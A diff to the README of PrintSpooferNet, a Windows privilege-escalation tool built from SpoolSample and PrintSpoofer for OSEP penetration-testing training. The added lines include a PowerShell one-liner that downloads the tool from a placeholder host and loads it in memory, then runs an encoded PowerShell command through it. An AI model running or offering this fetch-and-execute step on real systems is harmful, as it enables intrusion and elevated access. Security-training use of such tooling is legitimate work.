@@ -1,3 +1,12 @@
+# PrintSpooferNet
+Modified version of SpoolSample + PrintSpoofer. Made for OSEP. Able to run in memory directly
+
+e.g. in memory:
+```powershell
+[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://ip/PrintSpooferNet.exe'))
+[PrintSpooferNet.Program]::Main(@("any_pipe_name", "powershell -enc <base64>"))
+```
+
 # SpoolSample
 PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface.  This is possible via other protocols as well.
 
